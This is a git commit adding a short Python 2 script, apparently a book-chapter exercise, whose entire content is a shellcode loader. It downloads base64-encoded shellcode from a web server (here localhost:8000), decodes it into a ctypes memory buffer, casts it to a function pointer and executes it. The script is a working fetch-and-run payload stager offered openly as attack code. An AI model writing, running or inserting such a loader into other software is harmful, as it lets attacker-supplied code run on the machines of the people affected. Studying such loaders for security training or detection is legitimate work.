c5cbf0d4cf1265dd5f2932f88e87e03e99d2e7c7
A Sadavoy <sadavoya@gmail.com>
2017-01-28 22:08:38 -0500

    untested shell_exec.py

---
+++ 08chapter/shell_exec.py
@@ -0,0 +1,19 @@
+'''shell exec'''
+
+import urllib2
+import ctypes
+import base64
+
+def main(url):
+    '''main func'''
+    # retrieve the shellcode from our web server
+    response = urllib2.urlopen(url)
+    # decode  the shellcode from base64
+    shellcode = base64.b64decode(response.read())
+    # create a buffer in memory
+    shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))
+    # create a function pointer to our shellcode
+    shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_voidp))
+    # call our shellcode
+    shellcode_func()
+main('http://localhost:8000/shellcode.bin')
